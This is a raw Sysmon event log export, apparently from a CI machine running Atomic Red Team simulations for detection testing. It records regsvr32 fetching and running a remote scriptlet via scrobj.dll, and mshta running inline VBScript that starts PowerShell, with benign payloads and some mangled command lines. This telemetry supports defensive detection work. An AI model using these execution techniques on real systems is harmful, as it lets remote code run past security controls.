ParentProcessGuid: {f995aebf-63fb-6942-d606-000000000e00}
ParentProcessId: 3520
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:04:11.076
ProcessGuid: {f995aebf-63fa-6942-d306-000000000e00}
ProcessId: 752
Image: C:\Windows\system32\regsvr32.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.962
ProcessGuid: {f995aebf-63fa-6942-d306-000000000e00}
ProcessId: 752
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fa-6942-d106-000000000e00}
ParentProcessId: 3904
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:10.588
ProcessGuid: {f995aebf-63fa-6942-cc06-000000000e00}
ProcessId: 3632
Image: C:\Windows\System32\regsvr32.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.533
ProcessGuid: {f995aebf-63fa-6942-cc06-000000000e00}
ProcessId: 3632
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fa-6942-ca06-000000000e00}
ParentProcessId: 3396
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.317
ProcessGuid: {f995aebf-63fa-6942-c906-000000000e00}
ProcessId: 9512
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.298
ProcessGuid: {f995aebf-63fa-6942-c806-000000000e00}
ProcessId: 712
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:08.257
ProcessGuid: {f995aebf-63f8-6942-c406-000000000e00}
ProcessId: 6948
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_11iqdzyr.vud.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.869
ProcessGuid: {f995aebf-63f7-6942-c206-000000000e00}
ProcessId: 9008
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ekihfhzm.5di.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.493
ProcessGuid: {f995aebf-63f7-6942-c006-000000000e00}
ProcessId: 7412
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bn1ldber.nzt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.090
ProcessGuid: {f995aebf-63f6-6942-be06-000000000e00}
ProcessId: 8404
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_v3ckif3q.pcm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:06 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:06.897
ProcessGuid: {f995aebf-63f6-6942-bd06-000000000e00}
ProcessId: 900
Image: C:\Windows\System32\wbem\WmiApSrv.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:06 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 08:04:06.642
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\BITS\Start
Details: DWORD (0x00000002)
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:06.586
ProcessGuid: {f995aebf-63f6-6942-ba06-000000000e00}
ProcessId: 4112
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_am1j0sd4.e0n.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:06.162
ProcessGuid: {f995aebf-63f6-6942-b806-000000000e00}
ProcessId: 3404
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_txhl4i0g.1cx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:05 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:05.877
ProcessGuid: {f995aebf-63f5-6942-b706-000000000e00}
ProcessId: 6664
Image: C:\Windows\System32\wbem\WmiApSrv.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:05.562
ProcessGuid: {f995aebf-63f5-6942-b506-000000000e00}
ProcessId: 7844
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jg0kickx.kou.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:05 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 08:04:05.536
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\BITS\Start
Details: DWORD (0x00000003)
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:04.790
ProcessGuid: {f995aebf-63f4-6942-b006-000000000e00}
ProcessId: 1520
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:04.770
ProcessGuid: {f995aebf-63f4-6942-af06-000000000e00}
ProcessId: 7888
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:00.458
ProcessGuid: {f995aebf-63ef-6942-ab06-000000000e00}
ProcessId: 7288
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n4nbpg0j.zsi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:00 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:00.147
ProcessGuid: {f995aebf-63f0-6942-ae06-000000000e00}
ProcessId: 2992
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:59.995
ProcessGuid: {f995aebf-63ef-6942-ac06-000000000e00}
ProcessId: 9244
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:59.992
ProcessGuid: {f995aebf-63ef-6942-ad06-000000000e00}
ProcessId: 6576
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:59.904
ProcessGuid: {f995aebf-63ef-6942-ab06-000000000e00}
ProcessId: 7288
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-63ef-6942-aa06-000000000e00}
ParentProcessId: 5672
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: mshta.exe  ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run5672""""powershell.exe5672-nop5672-Command5672Write-Host5672Hello,5672MSHTA!;Start-Sleep5672-Seconds%205""""""))</script>'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:59.860
ProcessGuid: {f995aebf-63ef-6942-aa06-000000000e00}
ProcessId: 5672
Image: C:\Windows\System32\mshta.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:59.858
ProcessGuid: {f995aebf-63ef-6942-aa06-000000000e00}
ProcessId: 5672
Image: C:\Windows\System32\mshta.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:59.765
ProcessGuid: {f995aebf-63ef-6942-aa06-000000000e00}
ProcessId: 5672
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta.exe  ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").RunThe system cannot find the device specified. """"powershell.exeThe system cannot find the device specified. -nopThe system cannot find the device specified. -CommandThe system cannot find the device specified. Write-HostThe system cannot find the device specified. Hello,The system cannot find the device specified. MSHTA!;Start-SleepThe system cannot find the device specified. -SecondsNo process in the command subtree has a signal handler. """"""))</script>'""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63ef-6942-a806-000000000e00}
ParentProcessId: 6896
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run6896""""powershell.exe6896-nop6896-Command6896Write-Host6896Hello,6896MSHTA!;Start-Sleep6896-Seconds%205""""""))</script>'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:59.742
ProcessGuid: {f995aebf-63ef-6942-a806-000000000e00}
ProcessId: 6896
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").RunThe system cannot find the device specified. """"powershell.exeThe system cannot find the device specified. -nopThe system cannot find the device specified. -CommandThe system cannot find the device specified. Write-HostThe system cannot find the device specified. Hello,The system cannot find the device specified. MSHTA!;Start-SleepThe system cannot find the device specified. -SecondsNo process in the command subtree has a signal handler. """"""))</script>'""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:59.277
ProcessGuid: {f995aebf-63ef-6942-a606-000000000e00}
ProcessId: 8800
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cskqmro0.nhc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
